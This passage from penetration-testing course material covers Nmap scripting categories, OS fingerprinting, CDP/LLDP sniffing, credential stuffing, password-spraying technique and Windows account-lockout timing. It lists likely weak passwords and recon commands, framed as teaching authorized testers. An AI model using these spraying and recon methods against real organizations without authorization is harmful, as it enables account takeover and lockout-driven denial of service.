- **Vuln:** Look for a given vuln
- **Default:** Scripts run when Nmap is run with **-A** or **-sC** (no additional options)

NSE supports several different categories of tests. Each script may belong to one or more categories:

**Auth:** Tests associated with authentication, including some password guessing and authentication bypass tests.

**Broadcast:** Send packets on the local network destined for broadcast or multicast addresses to find new targets. If invoked with the newtargets argument, these discovered targets will automatically be included in the scan.

**Brute:** Launch brute force authentication guessing attacks and are available for a variety of different protocols.

**Discovery:** Determine more information about the network environment associated with the target and include some Whois and DNS lookups, among other functions.

**Dos:** May cause a denial-of-service condition on the target, possibly by crashing a service.

**Exploit**: Launch an exploit for some discovered vulnerability on a target, perhaps gaining shell on the target.

**External:** May send information to a third-party database or systems on the internet to pull additional data.

**Fuzzer:** Send unexpected input to a target system to see if a crash condition or other anomaly can be induced. These scripts can be useful in discovering previously unknown vulnerabilities in targets.

**Intrusive:** May leave logs, guess passwords (which could lock out accounts), consume excessive CPU or bandwidth, crash a target, or have other impacts on the target machines.

**Malware:** Looks for the presence of an infection or backdoor on the target. Examples in this category include checks to see if a port used by the given malware is open on the target and whether it responds as that malware would.

**Safe:** Designed to have minimal impact on a target, neither crashing it nor leaving any entries in its logs. Furthermore, these scripts should not utilize excessive bandwidth, nor should they exploit vulnerabilities.

**Version:** Attempts to determine which versions of services are present on the target. These scripts can be more complex than the normal version checking of Nmap.

**Vuln:** Determine whether a target has a given security flaw, such as a misconfiguration or an unpatched service.

**Default:** Scripts run with -sC or -A syntax and no specific script category or individual script specified.

# **Some Example NSE Scripts**

- Scripts are located in their own directory inside Nmap's directory
- **script.db** contains a list of scripts and their categories
- Several dozen scripts look for a variety of different conditions
  - − Look for common SMB vulnerabilities on target Windows machines
  - − Use admin creds across SMB session to make a target Windows machine run commands of the attacker's choosing, psexec style
  - − Test if a DNS server supports zone transfers
  - − Test whether a DNS server supports recursive lookups for external names
  - − Many, many more

The scripts associated with NSE are found in their own directory called, appropriately enough, scripts, which is located by default in the Nmap directory.

Inside this directory, there is a file called script.db that inventories the several dozen scripts in the directory. This handy file simply associates the given script with its category. Thus, we can easily search for "safe" scripts by running:

\$ grep safe /usr/local/share/nmap/scripts/script.db

"Intrusive" scripts can be found with:

\$ grep intrusive /usr/local/share/nmap/scripts/script.db

Note that the categories are in all lowercase within this file.

In the scripts directory, there are several dozen scripts. Some of the more interesting include:

- A script to find common SMB vulnerabilities on Windows targets
- A script that takes authentication credentials (such as an admin username and password or admin username and hash) and uses SMB to cause a Windows target to run a command, similar in functionality to the Microsoft SysInternals psexec command
- A script that attempts to do a DNS zone transfer from a target
- A script that tries to determine if a target DNS server supports forwarding recursive queries for thirdparty names for which it isn't authoritative
- A script that looks for Windows shells on TCP port 8888, which could easily be altered to look for them elsewhere
- A script that analyzes whether an SMTP server can be used as a mail relay, thus leaving it open to abuse by spammers

![](SEC560_Book2_page_33_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

![](SEC560_Book2_page_33_Picture_10.jpeg)

- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing

Lab 2.2: Password Guessing

- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks

Lab 2.3: Azure Recon and Password Attacks

- Sniffing and Relaying
- Responder

Lab 2.4: Responder

- Exploitation
- Exploit Categories
- Metasploit and Meterpreter

Lab 2.5: Metasploit and Meterpreter

# **Nmap Active OS Fingerprinting**

- Nmap attempts to determine the TCP/IP stack (OS) of targets by sending various packet types and measuring the response
- Different systems have different protocol behaviors that we can trigger and measure remotely
  - − Example: IPv4 TTL is arbitrary and reveals which TCP/IP stack is used on the remote machine
- Less reliable than it once was
  - − Modern operating systems have increased entropy when selecting initial values
  - − Better fingerprinting if the host returns RST on closed port (rare in modern networks)

![](SEC560_Book2_page_34_Picture_9.jpeg)

If possible, use OS-specific version scans instead of OS fingerprinting (like IIS, SMB, or SSH versions tied to OS releases)

In addition to finding out which ports are open on a system, an attacker also wants to determine which platform the system is based on. By determining the platform, the attacker can further research the system to determine the particular vulnerabilities it is subject to. For example, if the system is a Windows Server, the attacker can utilize various vulnerability disclosure sites to hone the attack.

The specifications for network protocols leave a lot of room for interpretation, and the software that implements this communication is quite complex. Thus, different vendor implementations of TCP, ICMP, IP, and other protocol behaviors differ. Nmap supports sending probes to a target machine to look for differences in these behaviors to identify the operating system type. This technique is called active OS fingerprinting because it sends packets out to measure the response of the machine in an effort to identify the OS type. It is active because it sends packets.

Nmap has included active OS fingerprinting functionality for many years. However, modern versions of Nmap have significantly changed this functionality from earlier versions. The original Nmap OS fingerprinting capabilities performed nine tests, most of which centered around how different operating systems respond to unusual TCP Control Bit settings. This older capability is often referred to as the "firstgeneration" OS fingerprinting capabilities of Nmap.

Recent versions of Nmap have a "second-generation" active OS fingerprinting capability. A huge number of new active fingerprinting techniques have been added in this suite. Currently, the second-generation tests are more accurate than the first. The most recent Nmap releases have dropped support altogether for the first-generation capability and now rely exclusively on the second-generation fingerprinting, which is invoked with either -O or -O2 at the Nmap command line. Older versions of Nmap supported -O1 for the first-generation capability, but that support has been removed in recent versions.

It is important to note that Nmap focuses on active fingerprinting. That is, Nmap sends packets at a target machine to measure its behavior in responding to the packets Nmap generates. Nmap does not currently support passive fingerprinting, which involves sending no packets but merely listening for packets from a

|  | target. Other tools (such as the free P0f2) do support passive OS fingerprinting. |
|--|-----------------------------------------------------------------------------------|
|  |                                                                                   |
|  |                                                                                   |
|  |                                                                                   |
|  |                                                                                   |
|  |                                                                                   |
|  |                                                                                   |
|  |                                                                                   |
|  |                                                                                   |
|  |                                                                                   |

![](SEC560_Book2_page_36_Picture_1.jpeg)

# **Simple OS Categorization**

- We need options beyond Nmap's OS Fingerprinting
- There are old tricks to help broadly categorize the OS, such as TTL values.
  - − Windows' default TTL value is 128
  - − Most Unix and Linux systems default TTL is 64.

```
sec560@560vm:~$ ping -c 1 10.130.10.22 | grep ttl
64 bytes from 10.130.10.22: icmp_seq=1 ttl=63 time=29.8 ms
sec560@560vm:~$ ping -c 1 10.130.10.25 | grep ttl
64 bytes from 10.130.10.25: icmp_seq=1 ttl=127 time=27.3 ms
```

- We can make similar characterizations by looking at open ports common to certain operating systems:
  - − Linux Ports: 22 (SSH), 111 (RPC), 631 (CUPS), 514 (syslog), 6000-6063 (X11)
  - − Windows: 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985,5986 (WinRM)
  - − macOS: 548 (AFP), 88,628 (Kerberos + macOS Open Directory), 5900 (VNC)

While Nmap's OS fingerprinting is valuable, we need additional techniques for reliable operating system identification during reconnaissance. One of the oldest and simplest tricks involves analyzing TTL (Time

TTL of 128, while most Unix and Linux systems default to 64. We can make similar characterizations by examining open port profiles, as different operating systems expose distinctive service combinations. Common Linux ports include 22 (SSH), 111 (RPC), 631 (CUPS), 514 (syslog), and 6000-6063 (X11), while Windows systems typically reveal 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), and 5985/5986 (WinRM). macOS systems have their own signature ports, including 548 (AFP), 88/628 (Kerberos with macOS Open Directory), and 5900 (VNC for Screen Sharing). These port-based patterns provide quick initial categorization that can guide more targeted fingerprinting efforts.

SEC560 | Enterprise Penetration Testing

36

#### **More Accurate OS Identification**

- Software version headers often include OS information
  - − FTP, Telnet, SMTP, and SSH do this often
  - − Sometimes, this includes manufacturers, product version numbers, and even build numbers
- The software versions themselves can be used to pinpoint the OS version
  - − OpenSSH 9.6p1 is associated with Ubuntu 24.04.

... Software Versions to OS Versions Cheat Sheet: https://0xdf.gitlab.io/cheatsheets/os

```
$ nmap -p 25 10.130.10.25 -sV
...
PORT STATE SERVICE VERSION
25/tcp open smtp Microsoft Exchange ...
...
$ nc -nvt 10.130.15.23 23
(UNKNOWN) [10.130.15.23] 23 (telnet) open
���� ��#��'����������!����
MikroTik v6.42.6 (stable)
Login: 
$ nmap -p22 -sV 10.130.10.10
...
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 9.6p1 Ubuntu...
```

Software version headers frequently reveal operating system information, with services like FTP, Telnet, SMTP, and SSH commonly exposing these details in their banners. These headers sometimes include not just the service name but also manufacturers, product version numbers, and even specific build numbers that provide valuable intelligence. The software versions themselves can be used to pinpoint exact OS versions—for example, OpenSSH 9.6p1 is specifically associated with Ubuntu 24.04, allowing us to deduce the underlying operating system from application-level banner information alone. There is a fantastic cheat sheet available at https://0xdf.gitlab.io/cheatsheets/os, which cross-references package repositories, Microsoft release information, and software versions to help determine operating systems.

![](SEC560_Book2_page_38_Picture_1.jpeg)

# **NTLMv1 & NTLMv2 for OS Fingerprinting**

- NSE scripts exist to gather information from Windows protocols that perform NTLMv1 and NTLMv2 authentication
  - − nmap -script \*-ntlm-info <target>
  - − Scans HTTP, MS-SQL, RDP, SMTP, and more

```
$ sudo nmap -n -PS3389 -p 3389 --open 10.130.10.4,44 --script rdp-ntlm-info
...
PORT STATE SERVICE
3389/tcp open ms-wbt-server
| rdp-ntlm-info: 
| Target_Name: HIBOXY
| NetBIOS_Domain_Name: HIBOXY
| NetBIOS_Computer_Name: DC01
| DNS_Domain_Name: hiboxy.com
| DNS_Computer_Name: dc01.hiboxy.com
| DNS_Tree_Name: hiboxy.com
| Product_Version: 10.0.20348
|_ System_Time: 2025-09-12T17:31:13+00:00
...
```

While Nmap's OS Detection feature doesn't provide us with much useful information, we have other options. There are NSE scripts to gather information from protocols that perform NTLMv1 and NTLMv2 authentication from Windows that can help us do this manually, as well.

![](SEC560_Book2_page_39_Picture_2.jpeg)

# **Identifying Network Devices**

- The Cisco Discovery Protocol (CDP) and Link Layer Discovery Protocol (LLDP) each leak information about Layer 2 devices
  - − OS versions, Native VLANs, Dynamic Trunking Protocol configurations
  - − Useful for exploit, default passwords, and even VLAN hopping
- Berkeley Packet Filters to gather information
  - − CDP: 'ether[20:2] == 0x2000' − LLDP: 'ether[12:2] == 0x88cc'

```
# tcpdump -nn -v -i eth0 -s 1500 'ether[20:2] == 0x2000' 
...
 Version String (0x05), value length: 285 bytes: 
          Cisco IOS Software, IOS-XE Software, Catalyst 4500 L3 Switch 
Software (cat4500es8-UNIVERSALK9-M), Version 03.11.04.E RELEASE SOFTWARE 
(fc2)
...
```

The Cisco Discovery Protocol (CDP) and Link Layer Discovery Protocol (LLDP) are valuable protocols that leak significant information about Layer 2 devices and network infrastructure. These protocols expose critical details, including operating system versions and firmware release numbers, which can be used to identify vulnerabilities.

Beyond version information, CDP and LLDP also reveal VLAN configurations across device ports. While not covered in the course, misconfigurations here can lead to VLAN hopping, especially when combined with protocols like Dynamic Trunking Protocol (DTP). By analyzing the port we're connected to, we can determine whether trunk negotiation or VLAN hopping attacks are possible.

We can use TCPDump and the following Berkeley Packet Filters (BPF) to gather the network device information. It's important to let the sniffer run for at least 1-3 minutes to ensure we capture a message. CDP sends every 60 seconds by default, and LLDP sends every 30 seconds.

```
For CDP: tcpdump -nn -v -I eth0 -s 1500 'ether[20:2] == 0x2000'
For LLDP: tcpdump -nn -v -I eth0 -s 1500 'ether[12:2] == 0x88cc'
```

![](SEC560_Book2_page_40_Picture_1.jpeg)

# **Version Scanning, OS Detection, NSE, and GoWitness**

Refer to the lab workbook for instructions.

![](SEC560_Book2_page_41_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing

Lab 2.2: Password Guessing

- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks

Lab 2.3: Azure Recon and Password Attacks

- Sniffing and Relaying
- Responder

Lab 2.4: Responder

- Exploitation
- Exploit Categories
- Metasploit and Meterpreter

Lab 2.5: Metasploit and Meterpreter

![](SEC560_Book2_page_42_Picture_2.jpeg)

# **Background**

Pen testers often gain initial access via network services.

- In an Assumed Breach, we start with access (laptop and account).
- Red teamers must fight for initial access, often via client-side attacks and social engineering/phishing.
- In the traditional penetration test, the testers start with only network connectivity (both internal and external).
- Penetration testers are commonly asked to identify all vulns, even if not exploitable (overlaps with vulnerability assessment).

We can gain initial access in multiple ways. In fact, with an Assumed Breach style test, we even start with access to the network. We'll discuss the Assumed Breach approach in detail in 560.3.

In a red team engagement, the testers need to fight for initial access. This access is often gained via phishing and/or social engineering. Initial access in a red team test can take a lot of time and is often a slow process.

With a traditional internal network penetration test, the testers start inside the network with their laptop (or dropbox) but without credentials. In these situations, the testers will need to fight for initial access, but they have a much bigger attack surface than just the perimeter network. Testers are often tasked with finding all (or many) of the internal vulnerabilities, similar to a vulnerability assessment. The goals of the target organization will guide us as to whether we should report on all identified issues or just ones that are actionable (or potentially actionable) for a real-world attacker.

42

#### **Where Does Access Come From?**

- Initial access usually happens in one of five primary ways:
  - − Exploitation of public-facing services
  - − Logging on to public-facing services (VPN, Remote Desktop, virtual desktops)
  - − Phishing for code execution
  - − Connecting a rogue device (whether wired or wireless)
  - − Supply chain attacks—not usually feasible for pen testers
- Before we can guess credentials or exploit a service, we need to know it exists
  - − Finding these services was part of the focus of 560.1
- Exploitation is covered in the module after next

Initial access comes through five primary ways:

- Exploitation of public-facing services (sometimes thought of as "real" exploitation)
- Logging in to public-facing services
- Social engineering and phishing with payloads
- Connecting rogue devices
- Supply chain attacks—not feasible for pen testers

Before we can do any type of password attack or exploit any services, we need to identify targets. Identifying accessible services was discussed on the recon and scanning portions of 560.1.

We are going to discuss password guessing attacks next, followed by exploitation. We'll discuss payload attacks later in this course after we introduce C2 frameworks.

![](SEC560_Book2_page_44_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing Lab 2.2: Password Guessing
- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks Lab 2.3: Azure Recon and Password Attacks
- Sniffing and Relaying
- Responder
  - Lab 2.4: Responder
- Exploitation
- Exploit Categories
- Metasploit and Meterpreter

Lab 2.5: Metasploit and Meterpreter

![](SEC560_Book2_page_45_Picture_2.jpeg)

# **Password Guessing vs. Password Cracking**

- Account lockout is *always* a concern
- Doesn't necessarily involve packets or a network (e.g., at a console)
- Logon system is aware of each attempt (<100 attempts per second)
- Specialized varieties:
  - − Credential stuffing (reused creds)
  - − Password spraying (one pw against many accounts to avoid lockout)

#### **Password Guessing ("Online") Password Cracking ("Offline")**

- Account lockout is not a concern
- Requires you to first acquire hashes
- Millions or billions of attempts per second, depending on hashing algorithm
- Then, on your own hardware:
  - 1. Guess a candidate password
  - 2. Hash that candidate password using the same algorithm as the original
  - 3. Compare the created hash vs. original
  - 4. If they're the same, you've cracked the hash!
  - 5. Otherwise, repeat with a new guess

First, let's discuss the two different classes of attacks: password guessing and password cracking.

Password guessing implies you are guessing one or more passwords against a system that is aware of each login attempt. This might be Gmail.com, an internal website, an SMB server, or even the login prompt of a stolen laptop.

With password cracking, you're not up against any lockout policies, as the login system isn't aware of how many times you've attempted to guess/hash/compare the stolen hash on your own machine.

![](SEC560_Book2_page_46_Picture_2.jpeg)

# **The Importance of Passwords**

- Passwords remain the dominant form of authentication today
  - − On intranets, certainly
  - − But often on internet-accessible systems as well (VPN, RDP, SSH, etc.)
- Professional network penetration testers and ethical hackers must understand password attacks at a fine-grained level
  - − They make up a crucial component of our arsenal

Password attacks are a crucial component of the professional penetration tester's and ethical hacker's arsenal. Unfortunately, today, the lowly password remains the dominant form of user authentication in most environments. This is certainly true on internal networks, where password access to mission-critical systems is common. But it's even true for most organizations across the internet. Many organizations still allow access via virtual private networks (VPNs), Secure Shell, web applications, and email using only a userID and password. For this reason, penetration testers and ethical hackers must understand password attacks at a fine-grained level. This module of the class focuses on this important attack vector.

Some less-experienced penetration testers fall into the mindset that exploits are what penetration testing is all about. "Give me a sweet remote 'sploit for a big new flaw, and that's all I need" is the mindset that some have.

Although a good exploit of a target machine can go a long way, after that system is conquered, attackers often turn to password attacks to get access to other systems. In other words, neither exploits nor password attacks are sufficient by themselves for a solid penetration test. We need both.

![](SEC560_Book2_page_47_Picture_2.jpeg)

# **Credential Stuffing**

Credential Stuffing reuses breached credentials to access other resources.

- Users often use the same password inside their organization that they use on thirdparty sites
- Username and password material is extracted from a third-party breach and cracked, then attackers attempt to log in at the target organization
- Good security practice dictates that each account should use a unique password for each account
  - − Many users find this difficult
  - − "Passwordless" login, 2FA, and password vaults are responses to this problem

Credential Stuffing is an attack where breached passwords from a third-party site are used to access other sites, often the original organization. The attack is commonly executed in an automated fashion, especially right after new breach data is published. An attacker finds password material, cracks it, and then uses the password against sites other than the breached site. The underlying issue here is password reuse.

When a user uses the same password across multiple sites/entities, they are creating a de facto trust between the organizations. If the password is breached at one organization, it can be used at the other. Good security practice dictates that each account should use a different password. This is obviously much easier said than done. Security professionals often have the technical acumen to use password vaults, but many others don't have the technical ability, don't want the expense, or like the ease of using a few passwords across many sites.

Organizations are trying to minimize the risk by adding extra security to passwords by adding 2FA/MFA or switching to "passwordless" authentication. In reality, passwordless authentication just moves the authentication to some other organization, such as your email provider or mobile carrier.

![](SEC560_Book2_page_48_Figure_0.jpeg)

The goal of a penetration test is to mimic the actions of a real-world attacker. The evil attackers are using leaked credentials from breaches, and we need to, too. There are a few paid services that allow you to search compromised credentials, most notably dehashed.com and leakcheck.net. To save costs or to customize their search capabilities, some penetration testers maintain their own breach databases where they manually import dumped credentials.

The image above has been edited and shows a fictitious email address and a real leaked password.

48

# **Types of Online Password Attacks**

#### **Password guessing (Traditional) Password Spray**

- One account, many passwords
- Increased likelihood of lockouts
- Often targets a known admin account (root, admin, etc.) with thousands of passwords since admin accounts often can't be locked out

- One password, many accounts
- An attacker only needs one account to gain a foothold
- There's a high likelihood at least one user will pick a guessable password
- Can still lock out accounts if attempts are too fast

There are two types of online password attacks: (traditional) password guessing and password spraying.

Traditional password guessing focuses on a single user (or a few users) and many passwords, often hundreds or thousands. This type of attack may be mitigated by account lockout protections. Since lockouts limit our ability to test a large number of passwords, the attack often focuses on accounts that do not lock out, such as root or administrative accounts.

With a password spray attack, the attacker targets a large number of users with a single password or a few passwords. It allows the attacker to make many attempts and decreases the likelihood of causing a lockout. This attack type targets users with guessable passwords.

An evil attacker does not care about account lockout and the potential for a denial of services. As penetration testers, we must take care not to hinder business operations and must, therefore, be careful to prevent account lockout.

![](SEC560_Book2_page_50_Picture_2.jpeg)

# **Making Good Guesses with a Custom Dictionary**

- Most password complexity requirements include uppercase, lowercase, and numbers (sometimes special characters, too)
- Use the current **<Season><Year>**
  - − Many organizations require rotation every 90 days, and users can simply look out the window to remember their password
  - − Try the current season, the next season, and the previous
- **Orgname1**, **Orgname2**, **Orgname3**, …
- **Password1**, **Password2**, **Password3**, …
- **Welcome1**, **Welcome2**, **Welcome3**, …
- Need a special character? Add a **!**

With password guessing attacks, we can only safely test a few passwords. If we go too fast, we risk lockouts, denial of services, or false negatives.

Most password policies require three of the following four classes of characters: uppercase, lowercase, numbers, and special characters. Users will typically use three of the above sets (upper, lower, number), especially among users who select bad passwords.

Password rotation and password reuse policies make it harder and harder for users to come up with a good and memorable password, which means some users will select easy-to-remember passwords. Penetration testers regularly come across passwords in the following forms:

- **<Season><Year>**—Try the current, previous, and next season as well as four- and two-digit years
- **Organization1-99**—Users will often increment with every rotation
- **Password1-99**
- **Welcome1-99**

The number of passwords used in a password guessing attack is very small. Often, you can only safely use a few passwords before you encroach on the lockout mechanism. The passwords used here must be very targeted.

Common bad passwords used for password guessing include the CompanyName1 and Password1. Both of these passwords will pass most of the password complexity rules that require an uppercase letter, a lowercase letter, and a digit. Another very good guess is derived from the organization's password rotation policy. Users get tired of coming up with new passwords and use a scheme to remember passwords. If the password rotation policy requires a change every 90 days, then users will many times use a password of <season><year>; if monthly, then <month><year>. These schemes will pass most password complexity requirements and thwart the password repeat detection. Also, the previous season/month as well as the next season/month may work, as you won't know when users were last required to change their password.

![](SEC560_Book2_page_51_Picture_1.jpeg)

# **Trimming Word Lists with Hydra's pw-inspector**

- Use **pw-inspector** to trim a wordlist based on the password policy
  - **-i** *file* Input file (or use Standard In)
  - **-o** *file* Output file (or use Standard Out)
  - **-m** *num* Min password length **-M** *num* Max password length
  - **-c** *num* Minimum number of criteria required in each password
- Available criteria:
  - **-l** Lowercase (lowercase L, not a 1)
  - **-u** Uppercase
  - **-n** Numbers
  - **-p** Printable characters which are not -l/-u/-n, such as: !@#\$%^&\*()
  - **-s** Special characters not within the sets above (including nonprintable)

Default Windows policy is three of uppercase, lowercase, numbers, printable, and special; filtered with: **pw-inspector -i** *file1* **-o** *file2* **-m 8 -c 3 -lunps**

In addition to Hydra (the password guesser) and xHydra (the GUI), this suite also comes with a useful tool called pw-inspector, which trims down wordlist files to select those words that match a specified password policy. Thus, we won't waste time guessing passwords that wouldn't meet the established policy requirements of the target.

Note, however, that sometimes you do want to send guesses that do not match the target system's or enterprise's password policies simply because some systems and user accounts do not comply with the policy.

The pw-inspector tool can take a list of words on Standard Input, remove words that do not meet certain specified criteria, and dump the resulting list of words on its Standard Output. Alternatively, instead of using stdin and stdout, users can specify input and output files with the -i and -o options, respectively. The -m *n* option tells pw-inspector that the minimum number of characters to use for a password is n. Any words that are shorter will be removed. Similarly, -M *N* says to remove all words longer than N characters.

The -c [count] option tells pw-inspector how many password criteria a given word must meet to be included in the list. In other words, some policies state, "A password of the three following criteria". A tester could then configure pw-inspector with -c 2. The criteria are defined using the following options:

- -l: The password must contain at least one lowercase character.
- -u: The password must contain at least one uppercase character. (To specify a mixed-case requirement, configure -c 2 -l -u.)
- **-n**: The password must contain at least one number.
- **-p**: The password must contain at least one printable character that is neither alphabetic nor numeric, which includes !@#\$%^&\*().
- **-s**: The password must include characters not included in the other lists (such as nonprintable ASCII characters).

![](SEC560_Book2_page_52_Picture_0.jpeg)

![](SEC560_Book2_page_52_Picture_1.jpeg)

# **Guessing Usernames**

When spraying, we are often guessing usernames.

- Common usernames
- Statistically likely usernames
  - − Use names common to the region and country, such as US Census data
  - − Use the format discovered during the recon phase, such as jdoe or john.doe
  - − https://github.com/insidetrust/statistically-likely-usernames
- There is no lockout for invalid usernames
  - − It does take extra time and generates extra logs

When password spraying, you are using a short list of passwords and guessing the usernames. We can get some usernames from the recon phase of the pen test. The recon phase should also help you identify the username and/or email format, such as first initial+last name (jdoe@target.com) or first name+last name (johndoe@target.com). Once we know the format, we can use common names for the region to identify even more real users. In the US, the Census Bureau has a list of the most common first names (given) and last names (surnames). We can use this data to select usernames that are more likely to exist in the target organization. The repository uses the census data to generate a list of "statistically likely usernames": https://github.com/insidetrust/statistically-likely-usernames

The repository also contains a list of names extracted from Facebook, which is much broader than just US Census data. The Facebook data is also grouped by the username format, such as flast (first initial, last name) and other formats.

The nice thing with password spraying is that trying multiple usernames with a single password will not cause a lockout of the user, so it will not negatively impact the user or the target organization. There may be tooling to do "smart lockout," such as with Azure, that will prevent you, the attacker, from guessing more passwords, but it doesn't deny the real user access to resources or lock the account.

# **Account Lockout**

Password guessing against a target that uses account lockout could result in a denial-of-service attack!

- Lockout must be considered before any password-guessing attack
- Account lockout is not an issue for password cracking
- You may want to have target environment personnel monitor systems carefully while you are conducting the attack

Account lockout functionality is an important issue that professional penetration testers and ethical hackers need to take into consideration during their tests. If your test regimen involves automated password guessing, you could lock out valid user accounts, possibly even accounts used by system administrators, resulting in a denial-of-service attack. Serious damage could be done to the target organization's business by an errant password-guessing attack during a penetration test when account lockout is involved.

It's important to note that account lockout is an issue for password guessing attacks but not password cracking attacks. In the latter, the attacker creates guesses, encrypts, and compares on the attacker's own systems without actually trying to log in to the target machine. Thus, the target machine cannot track any login attempts because there are no such attempts in a password cracking attack. But for password guessing, where an attacker actually tries to log in to the target machine, we need to take into account the possibility of account lockout.

While conducting a password-guessing attack, you may want to have personnel associated with the target environment monitor systems to determine if any accounts have been locked out by your work. Microsoft provides some separately downloadable free tools for Windows environments that can help with this tracking. The LockoutStatus.exe tool pulls information about locked-out accounts from Active Directory, letting an administrator pull the status regularly to see if accounts have been locked out recently while a test is running. Furthermore, the ALockout.dll tool helps troubleshoot account lockout problems by generating a text file showing the names of applications that are causing account lockout to happen in a Windows environment.

![](SEC560_Book2_page_54_Picture_1.jpeg)

#### **Account Lockout on Windows**

- **Lockout threshold:** Number of bad password attempts allowed
  - − Valid values between 0 (no lockout) and 999
- **Lockout observation window:** Minutes before the count is reset
  - − Must have zero bad attempts during that time
- **Lockout duration:** Minutes before account is automatically re-enabled
- To see what they are for a domain, run:

C:\> **net accounts /domain**

• Be aware of fine-grained password policies!

Safest Approach: One round of guessing per (longest) observation window

Three of the most important settings for account lockout on Windows machines are:

**Lockout threshold:** This count is the number of bad password attempts for an account that will be accepted before the account is locked out. Valid values range between 0 and 999. With a value of 0 (the default), accounts will never lock out. If the value is 5, the system will accept five attempts for each account, after which the given account will be locked.

**Lockout duration:** This is a measure, in minutes, of the amount of time that an account will be locked out until it is automatically re-enabled. If the value is 0, the account will be locked out until an administrator re-enables the account. The maximum value is 99999.

**Lockout observation window:** This configuration sets the time duration in minutes, over which bad logon attempts are counted. After this timeframe passes, the bad logon attempt counter is reset to 0. If account lockout has been enabled, this setting's value must be at least 1 and can range up to 99999.

To see the values of these settings on a local Windows machine, you can run:

#### C:\> net accounts

To see these settings for a Windows domain, you can run the following command on any system from an account that is an administrative member of the domain:

#### C:\> net accounts /domain

Fine-grained password policies allow administrators to have a different lockout policy for various groups or specific users. We recommend finding the longest observation window across all the policies and doing a single round of guessing in that window.

For more on fine-grained password policies, read the following Microsoft resource: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/introductionto-active-directory-administrative-center-enhancements--level-100-#fine\_grained\_pswd\_policy\_mgmt.

54

# **Active Directory Lockout Scenario**

Let's walk through password guessing a little too fast:

- Threshold: 3
  - − Three bad guesses locks out the account
- Observation window: 30
  - − 30-minute timer starting upon each incorrect password attempt
- Lockout duration: 60
  - − If the account is locked out, it's automatically re-enabled after 60 minutes

| Time  | Bad Guess Number |
|-------|------------------|
| 0:00  | 1                |
| 29:59 | 2                |
| 59:58 | 3                |

#### **Lockout!**

Any bad attempt resets the observation window. You might think that the first bad guess nearly an hour ago is forgotten, but it isn't! This account will be locked out for 60 minutes (Lockout Duration) and then automatically re-enabled.

We really need to be sure that each guess is beyond the observation window for the user. Even a single second too fast and the password count will not reset, meaning we get closer and closer to a lockout with each pass of guesses. If the observation window is 30 minutes, and you guess a password at 29:59, the incorrect password count is incremented and the window resets. Here is an example of what happens if you go just a little too fast with multiple passes of guesses (observation window of 30 minutes, lockout 3):

| Guess #       | Time  | Incorrect Password Count | Locked Out |
|---------------|-------|--------------------------|------------|
| Initial State | 0:00  | 0                        | No         |
| 1             | 0:00  | 1                        | No         |
| 2             | 29:59 | 2                        | No         |
| 3             | 59:58 | 3                        | Yes        |

Even though the first password guess was well over 30 minutes before the third guess, the first guess is not forgotten since the observation window was reset when the second incorrect guess happened. If the tester had waited just a second more before the third guess, the incorrect password count would reset to zero. For this reason, we recommend that you never go faster than one guess per hour, even if the observation window is shorter.

#### Reference:

• https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/resetaccount-lockout-counter-after

# **Suggested Spray Technique**

Suggestion: Attempt a single password per observation window

- Even safer, never go faster than one guess per hour (168 per week)
- Generate a short list of passwords to attempt across all users
- Determine the longest password observation Window in the organization (Active Directory allows multiple password policies)
  - − Ask the target personnel (be careful, as they are sometimes incorrect).
  - − Search policies with PowerShell or GetFGPP
- Select one tester to oversee spraying to ensure the clearing of the observation window, especially across multiple tool executions

It is much safer to take it slow when password spraying. One mistake here can mean a widespread lockout, causing a denial-of-service condition across the entire organization. We recommend going extra slowly so as not to cause issues. To begin, we need to generate a short list of passwords.

The key to staying safe is understanding the lockout policy in the organization. We can ask the target personnel about their policy, but they are sometimes unintentionally incorrect. Ideally, we can search for the password using PowerShell https://devblogs.microsoft.com/scripting/use-powershell-to-get-accountlockout-and-password-policy/ (redsiege.com/560/lockout).

You can use the GetFGPP tool to query the Fine Grained Password Policy (FGPP), but you can't see the details unless you are a domain administrator. The tool is available at https://github.com/n00py/GetFGPP.

The authors of this course suggest trying just a single password per user across the observation window. You could be more aggressive by trying one or two less than the smallest lockout number, but to be safe, we recommend you try only a single password.

# **Password Guessing Tools**

- Tool choice depends on the protocol, authentication type, and personal preference
- Hydra: https://github.com/vanhauser-thc/thc-hydra
- Legba: https://github.com/evilsocket/legba
- Ncrack: https://nmap.org/ncrack/
- Patator: https://github.com/lanjelot/patator
- Metasploit: https://metasploit.com
- Multiple Nmap Scripts
- Many other tools focusing on a specific technology or protocol

There are many different tools for password guessing. The most commonly used password-guessing tools are:

- Hydra: https://github.com/vanhauser-thc/thc-hydra
- Ncrack: https://nmap.org/ncrack/
